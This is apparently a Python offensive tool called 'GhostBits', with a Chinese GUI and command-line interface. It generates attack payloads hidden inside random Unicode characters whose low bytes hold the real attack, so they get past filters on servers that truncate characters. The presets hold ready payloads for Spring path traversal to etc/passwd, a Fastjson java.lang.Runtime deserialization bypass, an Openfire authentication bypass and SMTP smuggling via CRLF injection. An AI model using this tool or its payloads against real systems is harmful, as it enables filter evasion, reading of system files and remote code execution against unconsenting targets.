#!/usr/bin/env python3
import sys
import argparse
import random

# ==========================================
# 核心引擎 (Core Engine)
# ==========================================
class GhostBitsEngine:
    def __init__(self):
        pass

    def get_ghost_char(self, char, mode):
        ll = ord(char)
        if ll > 255:
            return char
            
        valid_hhs = []
        fallback_hhs = [] 
        
        if mode == 0:   # GB2312 一级常用汉字
            for hh in range(0x4E, 0x9F + 1):
                codepoint = (hh << 8) | ll
                if 0x4E00 <= codepoint <= 0x9FA5:
                    test_char = chr(codepoint)
                    fallback_hhs.append(hh)
                    try:
                        gb_bytes = test_char.encode('gb2312')
                        if 0xB0 <= gb_bytes[0] <= 0xD7:
                            valid_hhs.append(hh)
                    except UnicodeEncodeError:
                        pass
            if not valid_hhs:
                valid_hhs = fallback_hhs 
                
        elif mode == 1: # 拉丁/希腊字母
            valid_hhs = [0x01, 0x02, 0x03, 0x04]
        else:           # 随机全局
            valid_hhs = [hh for hh in range(0x01, 0xFF + 1) if not (0xD8 <= hh <= 0xDF)]

        if not valid_hhs:
            return char
            
        chosen_hh = random.choice(valid_hhs)
        return chr((chosen_hh << 8) | ll)

    def generate(self, base_text, repeats=1, tail="", mode=0, exempt_chars="", as_unicode=False):
        # 处理特殊标记
        base_text = base_text.replace("[CRLF]", "\r\n").replace("\\r", "\r").replace("\\n", "\n")
        
        full_payload = ""
        for _ in range(repeats):
            for char in base_text:
                if char in exempt_chars:
                    full_payload += char # 豁免转换，保留原文
                else:
                    ghost_char = self.get_ghost_char(char, mode)
                    if as_unicode:
                        # 转换为 \uXXXX 格式，注意要保证4位16进制
                        full_payload += f"\\u{ord(ghost_char):04x}"
                    else:
                        full_payload += ghost_char
                        
        return full_payload + tail

# ==========================================
# 图形界面 (GUI Mode)
# ==========================================
def run_gui():
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox

    class GhostBitsGUI:
        def __init__(self, root):
            self.root = root
            self.root.title("GBitsTools")
            self.root.geometry("700x400")
            self.engine = GhostBitsEngine()
            self.create_widgets()

        def create_widgets(self):
            # 预设
            preset_frame = ttk.LabelFrame(self.root, text="🔥 漏洞预设 (一键加载)")
            preset_frame.pack(fill="x", padx=10, pady=5)
            self.preset_combo = ttk.Combobox(preset_frame, state="readonly", width=80)
            self.presets = {
                "0. 手动自定义": {"base": "", "repeat": 1, "tail": "", "exempt": "", "unicode": False},
                "1. Spring 目录穿越": {"base": ".%u002e/", "repeat": 7, "tail": "etc/passw%64", "exempt": "/", "unicode": False},
                "2. Fastjson @type 绕过 (JSON)": {"base": '{"@type":"java.lang.Runtime"}', "repeat": 1, "tail": "", "exempt": '{}":.', "unicode": True},
                "3. Openfire 权限绕过": {"base": "%2>/", "repeat": 4, "tail": "log.jsp", "exempt": "/", "unicode": False},
                "4. SMTP 邮件走私": {"base": "[CRLF]DATA[CRLF]Subject: PWNED[CRLF].[CRLF]QUIT", "repeat": 1, "tail": "", "exempt": "", "unicode": False}
            }
            self.preset_combo['values'] = list(self.presets.keys())
            self.preset_combo.current(1)
            self.preset_combo.bind("<<ComboboxSelected>>", self.load_preset)
            self.preset_combo.pack(padx=10, pady=10, side="left")

            # 参数
            settings_frame = ttk.LabelFrame(self.root, text="⚙️ 载荷构造参数")
            settings_frame.pack(fill="x", padx=10, pady=5)

            ttk.Label(settings_frame, text="基础 Payload:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
            self.base_input = ttk.Entry(settings_frame, width=40)
            self.base_input.grid(row=0, column=1, sticky="w", padx=5, pady=5)
            
            ttk.Label(settings_frame, text="重复次数:").grid(row=0, column=2, sticky="w", padx=5, pady=5)
            self.repeat_spin = ttk.Spinbox(settings_frame, from_=1, to=20, width=5)
            self.repeat_spin.grid(row=0, column=3, sticky="w", padx=5, pady=5)

            ttk.Label(settings_frame, text="不混淆的尾部:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
            self.tail_input = ttk.Entry(settings_frame, width=40)
            self.tail_input.grid(row=1, column=1, columnspan=3, sticky="w", padx=5, pady=5)

            ttk.Label(settings_frame, text="豁免字符(不转换):").grid(row=2, column=0, sticky="w", padx=5, pady=5)
            self.exempt_input = ttk.Entry(settings_frame, width=40)
            self.exempt_input.grid(row=2, column=1, sticky="w", padx=5, pady=5)
            ttk.Label(settings_frame, text="例如: /{}\":").grid(row=2, column=2, sticky="w", padx=5, pady=5)

            ttk.Label(settings_frame, text="🎭 伪装字符集:").grid(row=3, column=0, sticky="w", padx=5, pady=5)
            self.camouflage_combo = ttk.Combobox(settings_frame, state="readonly", width=38)
            self.camouflage_combo['values'] = ["0. 常用口水汉字 (GB2312)", "1. 拉丁/希腊/西里尔文", "2. 全字符集乱码"]
            self.camouflage_combo.current(0)
            self.camouflage_combo.grid(row=3, column=1, sticky="w", padx=5, pady=5)

            self.use_unicode = tk.BooleanVar(value=False)
            ttk.Checkbutton(settings_frame, text="输出为 \\uXXXX 格式 (适用于 JSON 等)", variable=self.use_unicode).grid(row=3, column=2, columnspan=2, sticky="w", padx=5)

            # 输出
            action_frame = ttk.Frame(self.root)
            action_frame.pack(fill="both", expand=True, padx=10, pady=5)
            ttk.Button(action_frame, text="生成", command=self.generate).pack(pady=10)
            self.output_box = scrolledtext.ScrolledText(action_frame, height=12, font=("Consolas", 11))
            self.output_box.pack(fill="both", expand=True, pady=5)
            ttk.Button(action_frame, text="复制", command=self.copy_output).pack(pady=5)
            
            self.load_preset()

        def load_preset(self, event=None):
            data = self.presets.get(self.preset_combo.get(), self.presets["0. 手动自定义"])
            self.base_input.delete(0, tk.END); self.base_input.insert(0, data["base"])
            self.repeat_spin.delete(0, tk.END); self.repeat_spin.insert(0, str(data["repeat"]))
            self.tail_input.delete(0, tk.END); self.tail_input.insert(0, data["tail"])
            self.exempt_input.delete(0, tk.END); self.exempt_input.insert(0, data["exempt"])
            self.use_unicode.set(data["unicode"])

        def generate(self):
            try: repeats = int(self.repeat_spin.get())
            except: repeats = 1
            
            payload = self.engine.generate(
                base_text=self.base_input.get(),
                repeats=repeats,
                tail=self.tail_input.get(),
                mode=self.camouflage_combo.current(),
                exempt_chars=self.exempt_input.get(),
                as_unicode=self.use_unicode.get()
            )
            self.output_box.delete("1.0", tk.END)
            self.output_box.insert(tk.END, payload)

        def copy_output(self):
            text = self.output_box.get("1.0", tk.END).strip()
            if text:
                self.root.clipboard_clear()
                self.root.clipboard_append(text)
                messagebox.showinfo("成功", "已复制")

    root = tk.Tk()
    app = GhostBitsGUI(root)
    root.mainloop()

# ==========================================
# 命令行界面 (CLI Mode)
# ==========================================
def run_cli():
    parser = argparse.ArgumentParser(description="Ghost Bits Payload Generator (CLI)")
    parser.add_argument("-p", "--payload", required=True, help="基础 Payload (必填)")
    parser.add_argument("-r", "--repeat", type=int, default=1, help="重复次数 (默认: 1)")
    parser.add_argument("-t", "--tail", default="", help="尾部明文字符串")
    parser.add_argument("-m", "--mode", type=int, choices=[0, 1, 2], default=0, help="模式: 0(常用汉字), 1(拉丁/西里尔), 2(随机乱码)")
    parser.add_argument("-e", "--exempt", default="", help="豁免转换的字符 (如 / 或 {} )")
    parser.add_argument("-u", "--unicode", action="store_true", help="输出为 \\uXXXX 转义格式")
    
    args = parser.parse_args()
    engine = GhostBitsEngine()
    
    result = engine.generate(
        base_text=args.payload,
        repeats=args.repeat,
        tail=args.tail,
        mode=args.mode,
        exempt_chars=args.exempt,
        as_unicode=args.unicode
    )
    print(result)

if __name__ == "__main__":
    # 如果带有参数，则进入命令行模式；否则打开 GUI
    if len(sys.argv) > 1:
        run_cli()
    else:
        run_gui()